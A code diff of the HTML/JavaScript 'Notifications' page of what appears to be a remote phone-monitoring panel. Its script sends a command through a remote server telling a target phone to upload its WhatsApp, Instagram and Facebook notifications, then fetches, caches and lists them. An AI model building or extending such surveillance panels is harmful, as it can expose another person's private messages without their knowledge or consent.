@@ -25,25 +25,33 @@
             font-family: 'Segoe UI', sans-serif;
             margin: 0; padding: 10px;
             display: flex; justify-content: center;
-            height: 100vh; /* Full screen fix */
-            overflow: hidden; /* Body scroll band */
+            height: 100vh;
+            overflow: hidden;
         }
 
-        /* --- Main Container (Contact Page Jaisa) --- */
         .container {
             width: 100%; max-width: 450px;
             background: rgba(0, 0, 0, 0.5);
             border-radius: 30px; padding: 20px;
             border: 1px solid var(--glass-border);
-            height: 90vh; /* Fixed height taaki scroll andar ho */
+            height: 90vh;
             display: flex;
             flex-direction: column;
         }
 
         .header {
             display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 15px; padding-bottom: 10px;
+            margin-bottom: 10px; padding-bottom: 10px;
             border-bottom: 1px solid var(--glass-border);
+            flex-shrink: 0;
+        }
+
+        /* Status Bar (Newly Added like Contacts) */
+        #apiStatus {
+            background: rgba(0, 243, 255, 0.05);
+            font-size: 11px; padding: 8px; border-radius: 12px;
+            margin-bottom: 10px; border-left: 3px solid #00f3ff;
+            color: #00f3ff; font-family: monospace;
             flex-shrink: 0;
         }
 
@@ -61,7 +69,6 @@
             display: flex; align-items: center; justify-content: center;
         }
 
-        /* --- Filters (Horizontal Scroll) --- */
         .filters {
             display: flex; gap: 8px; overflow-x: auto; 
             padding-bottom: 10px; margin-bottom: 10px;
@@ -78,24 +85,24 @@
             background: var(--accent); color: white; border-color: var(--accent); font-weight: bold;
         }
 
-        /* --- Notification List (Scrollable Area) --- */
         .notif-list {
             display: flex; flex-direction: column; gap: 10px;
-            overflow-y: auto; /* Sirf ye area scroll karega */
+            overflow-y: auto;
             padding-right: 5px;
-            flex-grow: 1; /* Baki bachi jagah lega */
+            flex-grow: 1;
         }
 
-        /* Scrollbar Styling */
         .notif-list::-webkit-scrollbar { width: 4px; }
         .notif-list::-webkit-scrollbar-thumb { background: #444; border-radius: 10px; }
 
-        /* --- Card Design --- */
         .notif-card {
             background: var(--glass-bg); padding: 12px;
             border-radius: 15px; display: flex; align-items: flex-start;
             border: 1px solid var(--glass-border);
+            animation: fadeIn 0.3s ease-in;
         }
+        
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
         .icon-box {
             width: 40px; height: 40px;
@@ -104,7 +111,6 @@
             font-size: 1.2rem; margin-right: 12px; flex-shrink: 0;
         }
 
-        /* App Specific Colors */
         .whatsapp-icon { background: rgba(37, 211, 102, 0.2); color: var(--whatsapp); border: 1px solid var(--whatsapp); }
         .insta-icon { background: rgba(225, 48, 108, 0.2); color: var(--instagram); border: 1px solid var(--instagram); }
         .fb-icon { background: rgba(24, 119, 242, 0.2); color: var(--facebook); border: 1px solid var(--facebook); }
@@ -126,10 +132,12 @@
 
     <div class="container">
         <div class="header">
-            <a href="javascript:history.back()" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
+            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
             <span class="page-title">Notifications</span>
-            <button onclick="location.reload()" class="refresh-btn"><i class="fa-solid fa-sync"></i></button>
+            <button onclick="handleRefresh()" class="refresh-btn" id="refreshBtn"><i class="fa-solid fa-sync"></i></button>
         </div>
+
+        <div id="apiStatus">Waiting for input...</div>
 
         <div class="filters">
             <div class="filter-chip active" onclick="filterList('all', this)">All</div>
@@ -140,23 +148,116 @@
         </div>
 
         <div class="notif-list" id="notifContainer">
-            <div style="text-align: center; color: #666; margin-top: 50px;">Loading...</div>
+            <div style="text-align: center; color: #666; margin-top: 50px;">Loading data...</div>
         </div>
     </div>
 
     <script>
+        // --- CONFIGURATION ---
+        const SERVER_URL = "https://child-v9no.onrender.com";
         const urlParams = new URLSearchParams(window.location.search);
-        const deviceId = urlParams.get('id');
-        const API_URL = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
-
+        const DEVICE_ID = urlParams.get('id');
+        
+        const storageKey = `notifs_${DEVICE_ID}`;
+        const statusEl = document.getElementById("apiStatus");
         let allData = [];
+
+        // --- INIT ---
+        document.addEventListener("DOMContentLoaded", () => {
+            if (!DEVICE_ID) {
+                setStatus("Error: Device ID missing!", true);
+                return;
+            }
+            setStatus(`ID: ${DEVICE_ID} | Ready`);
+            
+            // 1. Purana Data Dikhao (Local Storage)
+            loadFromStorage();
+            
+            // 2. Naya Data Mango
+            handleRefresh();
+        });
+
+        // --- FUNCTIONS ---
+
+        function setStatus(msg, isError = false) {
+            statusEl.style.color = isError ? "#ff4444" : "#00f3ff";
+            statusEl.style.borderColor = isError ? "#ff4444" : "#00f3ff";
+            statusEl.innerHTML = `📡 ${msg}`;
+        }
+
+        function loadFromStorage() {
+            const saved = localStorage.getItem(storageKey);
+            if (saved) {
+                allData = JSON.parse(saved);
+                renderList(allData);
+            }
+        }
+
+        function handleRefresh() {
+            const btn = document.getElementById("refreshBtn");
+            btn.querySelector('i').classList.add('fa-spin');
+            
+            // Step 1: Send Command to Phone
+            sendCommand();
+
+            // Step 2: Fetch Data (Thoda ruk ke taaki phone upload kar de)
+            setStatus("Syncing with phone...");
+            setTimeout(fetchData, 3000); 
+        }
+
+        function sendCommand() {
+            // Server ko bolo phone se data maange
+            fetch(`${SERVER_URL}/api/send-command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: DEVICE_ID, command: 'notifications' })
+            }).then(res => res.json())
+              .then(d => console.log("Command Sent:", d))
+              .catch(e => console.error("Command Error:", e));
+        }
+
+        function fetchData() {
+            const btn = document.getElementById("refreshBtn");
+            const API_URL = `${SERVER_URL}/api/get-data/${DEVICE_ID}/notifications?t=${Date.now()}`;
+
+            fetch(API_URL)
+                .then(res => res.json())
+                .then(data => {
+                    btn.querySelector('i').classList.remove('fa-spin');
+                    
+                    if (!data || data.length === 0) {
+                        setStatus("No new notifications found.");
+                        // Agar list khali hai aur purana data nahi hai toh message dikhao
+                        if(allData.length === 0) {
+                            document.getElementById("notifContainer").innerHTML = 
+                                "<div style='text-align: center; color: #666; margin-top: 20px;'>No notifications yet.<br><small>Try refreshing again.</small></div>";
+                        }
+                        return;
+                    }
+
+                    // Data mil gaya
+                    setStatus(`Updated: ${data.length} notifications received.`);
+                    allData = data;
+                    localStorage.setItem(storageKey, JSON.stringify(data));
+                    
+                    // Filter check karke render karo
+                    const activeFilterBtn = document.querySelector('.filter-chip.active');
+                    const filterType = activeFilterBtn ? activeFilterBtn.innerText.toLowerCase() : 'all';
+                    // Mapping 'All' text to 'all' keyword
+                    filterList(filterType === 'all' ? 'all' : filterType, activeFilterBtn);
+                })
+                .catch(err => {
+                    btn.querySelector('i').classList.remove('fa-spin');
+                    setStatus("Connection Error!", true);
+                });
+        }
 
         function renderList(data) {
             const container = document.getElementById("notifContainer");
             container.innerHTML = "";
 
-            if (data.length === 0) {
-                container.innerHTML = "<div style='text-align: center; color: #666; margin-top: 20px;'>No notifications found.</div>";
+            if (!data || data.length === 0) {
+                container.innerHTML = "<div style='text-align: center; color: #666; margin-top: 20px;'>No data available.</div>";
                 return;
             }
 
@@ -164,7 +265,7 @@
             data.slice().reverse().forEach(item => {
                 const appName = (item.appName || "System").toLowerCase();
                 const title = item.title || "Unknown";
-                const text = item.text || "New Notification";
+                const text = item.text || "Notification";
                 
                 // Icon Logic
                 let iconClass = '';
@@ -207,46 +308,23 @@
         }
 
         function filterList(type, element) {
-            // Active class change
-            document.querySelectorAll('.filter-chip').forEach(btn => btn.classList.remove('active'));
-            element.classList.add('active');
+            // Visual active update
+            if(element) {
+                document.querySelectorAll('.filter-chip').forEach(btn => btn.classList.remove('active'));
+                element.classList.add('active');
+            }
 
-            if (type === 'all') {
+            let filterKey = type.toLowerCase();
+            
+            if (filterKey === 'all') {
                 renderList(allData);
             } else {
                 const filtered = allData.filter(item => 
-                    (item.appName || "").toLowerCase().includes(type)
+                    (item.appName || "").toLowerCase().includes(filterKey)
                 );
                 renderList(filtered);
             }
         }
-
-        // Fetch Data
-        fetch(API_URL)
-            .then(res => res.json())
-            .then(data => {
-                allData = data;
-                renderList(data);
-            })
-            .catch(err => {
-                document.getElementById("notifContainer").innerHTML = "<div style='text-align:center; color:red'>Failed to load data</div>";
-            });
-
-        // Auto Refresh
-        setInterval(() => {
-            fetch(API_URL).then(res => res.json()).then(data => {
-                if(JSON.stringify(data) !== JSON.stringify(allData)) {
-                    allData = data;
-                    const activeFilter = document.querySelector('.filter-chip.active').innerText.toLowerCase();
-                    // Simple refresh logic, filter ko maintain karne ke liye thoda complex logic chahiye hota hai,
-                    // abhi ke liye bas 'all' par reset hone se bachane ke liye UI refresh tabhi karenge agar user 'all' par hai.
-                    // Better yet, hum bas data update karte hain.
-                    if(document.querySelector('.filter-chip.active').innerText === 'All') {
-                         renderList(data);
-                    }
-                }
-            });
-        }, 5000);
     </script>
 </body>
 </html>
